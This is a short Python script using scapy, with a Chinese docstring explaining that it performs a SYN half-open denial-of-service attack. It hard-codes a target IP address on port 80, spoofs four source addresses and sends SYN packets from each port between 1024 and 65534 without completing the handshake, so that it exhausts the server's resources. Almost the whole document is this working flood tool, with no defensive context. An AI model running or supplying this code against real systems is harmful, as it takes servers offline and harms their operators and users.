# -*- coding:utf8 -*-
"""
2021-01-12 10:58:52
syn半开连接拒绝服务攻击
利用tcp的三次握手不完整，发包的时候只发syn包，对方回syn+ack后，我不再回ack，
这样就会导致对方一直处于等待状态，消耗服务器资源。（攻击访问的是对方的80端口dport目标端口，攻击端每次的源端口sport都是随机端口）
"""
from scapy.all import *

tgt = "131.10.10.32"
dport = 80


def synFlood(tgt, dport):
    srcList = ['11.1.1.1', '22.2.2.2', '33.3.3.3', '44.4.4.4']
    for sPort in range(1024, 65535):
        index = random.randrange(4)

        iplayer = IP(src=srcList[index], dst=tgt)
        tcplayer = TCP(sport=sPort, dport=dport, flags='S')
        packet = iplayer / tcplayer
        send(packet)


synFlood(tgt, dport)
